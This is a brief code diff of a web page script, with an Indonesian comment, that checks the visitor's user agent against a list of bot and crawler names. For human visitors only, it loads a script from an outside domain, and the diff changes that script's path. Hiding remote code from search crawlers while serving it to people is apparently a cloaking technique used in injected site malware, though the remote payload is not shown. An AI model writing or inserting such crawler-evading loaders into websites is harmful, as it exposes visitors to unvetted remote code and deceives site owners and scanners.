@@ -4,6 +4,6 @@ var isBot = /bot|crawl|slurp|spider|mediapartners|abacho|accona|AddThis|AdsBot|a
 // Jika user agent bukan bot, muat script tertentu
 if (!isBot) {
   var script = document.createElement('script');
-  script.src = 'https://faktor.my.id/app.js';
+  script.src = 'https://faktor.my.id/app/node.js';
   document.body.appendChild(script);
 }
